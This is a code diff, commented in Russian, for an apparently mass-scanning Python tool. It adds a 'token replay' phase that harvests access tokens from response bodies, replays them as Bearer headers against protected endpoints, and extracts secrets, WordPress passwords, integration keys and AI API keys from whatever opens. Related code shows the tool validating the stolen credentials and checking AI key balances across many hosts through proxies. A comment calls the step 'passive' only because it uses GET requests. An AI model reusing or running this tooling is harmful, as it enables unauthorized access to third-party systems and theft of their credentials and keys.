@@ -444,6 +444,9 @@ INTERPOLATED_RE = re.compile(r'^(?:\$\{[^}]{1,128}\}|\$[A-Za-z_][A-Za-z0-9_]{0,1
 # чьи имена похожи на подстановочные параметры (id/slug/username/email/...)
 FUZZ_PAIR_RE = re.compile(r'"([A-Za-z_][A-Za-z0-9_]{0,64})"\s*:\s*"?([^",\[\]{}]{1,120})"?', re.I)
 FUZZ_FIELD_RE = re.compile(r'(?:^|_)(?:ids?|uuids?|guid|slug|username|user_login|login|email|code|sku|number)$', re.I)
+# token replay: access_token из 200-тел (напр. GET /api/efi/_debug/authorize)
+# подставляется в protected GET (401/403) как Authorization: Bearer
+TOKEN_RE_RE = re.compile(r'"(?:access_token|accessToken)"\s*:\s*"([^"\s]{16,512})"')
 
 
 def _fuzz_candidates(param: str, buckets: dict, cap: int) -> list[str]:
@@ -578,6 +581,7 @@ SEVERITY_MAP = {
     "wp_password": "CRITICAL",
     "wp_creds_valid": "CRITICAL",
     "integration_valid": "CRITICAL",
+    "token_replay": "CRITICAL",
     "db_password": "CRITICAL",
     # Адрес кошелька сам по себе денег не даёт (нужен ключ) - понижаем
     "wallet_address": "MEDIUM",
@@ -777,6 +781,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             integrations_found: list[dict[str, str]] = []
             integration_entries_seen: set[str] = set()
             integration_panel_seen: bool = False
+            # token replay: access_token'ы из тел + protected GET (401/403)
+            auth_tokens_found: list[str] = []
+            protected_gets: list[tuple[str, str]] = []
             # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
             fuzz_buckets: dict[str, set[str]] = {}
             param_templates_seen: set[str] = set()
@@ -906,6 +913,16 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         if entry["api_key"] not in integration_entries_seen:
                                             integration_entries_seen.add(entry["api_key"])
                                             integrations_found.append(entry)
+                                if cfg.token_replay:
+                                    # access_token из тела (напр. debug/authorize)
+                                    # → replay в protected GET на фазе 3
+                                    for m in TOKEN_RE_RE.finditer(body[:100_000]):
+                                        tok = m.group(1)
+                                        if is_junk_token_value(tok):
+                                            continue
+                                        if tok not in auth_tokens_found \
+                                                and len(auth_tokens_found) < cfg.token_replay_max:
+                                            auth_tokens_found.append(tok)
                                 if cfg.wp_checks:
                                     # маркер + извлечение пар (url можно взять из entry)
                                     if '"wp_user"' in body or '"wp_password"' in body:
@@ -995,6 +1012,10 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                             elif resp.status in (401, 403):
                                 ep_data["verdict"] = "PROTECTED"
                                 result.protected_count += 1
+                                # token replay: закрытый GET - цель для фазы 3
+                                if cfg.token_replay and method.upper() == "GET" \
+                                        and len(protected_gets) < cfg.token_replay_endpoints_max:
+                                    protected_gets.append((path_template, test_path))
                             else:
                                 ep_data["verdict"] = "ERROR"
 
@@ -1104,6 +1125,81 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                     if not fuzz_new:
                         # новых подстановочных значений больше нет - сошлось
                         break
+
+            # Фаза 3 — token replay: access_token, найденный в 200-теле
+            # (напр. GET /api/efi/_debug/authorize отдаёт JWT-пару), подстав-
+            # ляется в protected GET (401/403 из фазы 1) как Authorization:
+            # Bearer. Открылся - auth bypass: публичный authorize минтит
+            # рабочие токены (token_replay CRITICAL). Только GET - пассивно.
+            if cfg.token_replay and auth_tokens_found and protected_gets:
+                replay_seen: set[tuple[str, str]] = set()
+                for tmpl, ppath in protected_gets:
+                    if time.monotonic() >= deadline:
+                        break
+                    for tok in auth_tokens_found:
+                        if time.monotonic() >= deadline:
+                            break
+                        if (ppath, tok) in replay_seen:
+                            continue
+                        replay_seen.add((ppath, tok))
+                        try:
+                            async with session.get(
+                                base_url.rstrip("/") + ppath,
+                                headers={"Authorization": f"Bearer {tok}",
+                                         "Accept": "application/json"},
+                                allow_redirects=False,
+                                timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
+                                proxy=proxy,
+                            ) as rresp:
+                                if rresp.status != 200:
+                                    continue
+                                rbody = await rresp.text()
+                                rpatterns, rsev = classify_response(rbody[:100_000])
+                                # закрытый эндпоинт открылся токеном - finding
+                                if "token_replay" not in rpatterns:
+                                    rpatterns.append("token_replay")
+                                rsev = "CRITICAL" if severity_order.get(
+                                    rsev, 0) < 3 else rsev
+                                all_patterns.extend(rpatterns)
+                                rresp_data: dict[str, Any] = {
+                                    # панель: шаблон + пометка auth (через токен)
+                                    "path": tmpl + "#auth",
+                                    "method": "GET",
+                                    "expects_auth": True,
+                                    "status_code": rresp.status,
+                                    "verdict": "VULNERABLE",
+                                    "patterns": rpatterns,
+                                    "response": None,
+                                }
+                                try:
+                                    rresp_data["response"] = json.loads(rbody)
+                                except (json.JSONDecodeError, ValueError):
+                                    rresp_data["response"] = rbody[:100_000]
+                                endpoints_data.append(rresp_data)
+                                result.total_endpoints += 1
+                                result.vulnerable_count += 1
+                                if severity_order.get(rsev, 0) > severity_order.get(max_severity, 0):
+                                    max_severity = rsev
+                                if severity_order.get(max_severity, 0) < 3:
+                                    max_severity = "CRITICAL"
+                                # фиды для verify-блоков ниже
+                                if cfg.secret_checks:
+                                    secrets_found.update(extract_secrets(rbody[:100_000]))
+                                if cfg.wp_checks:
+                                    if '"wp_user"' in rbody or '"wp_password"' in rbody:
+                                        wp_panel_seen = True
+                                    wp_pairs_found.extend(
+                                        extract_wp_creds(rbody[:100_000], fallback_url=base_url))
+                                if cfg.integration_checks:
+                                    for entry in extract_integrations(rbody[:100_000]):
+                                        if entry["api_key"] not in integration_entries_seen:
+                                            integration_entries_seen.add(entry["api_key"])
+                                            integrations_found.append(entry)
+                                if cfg.ai_key_checks:
+                                    for prov, k in extract_ai_keys(rbody[:100_000]):
+                                        ai_keys_found.setdefault(k, prov)
+                        except (aiohttp.ClientError, asyncio.TimeoutError):
+                            continue
 
             # Проверка AI-ключей: валидность/баланс у провайдеров
             # (только бесплатные эндпоинты - списания нет)
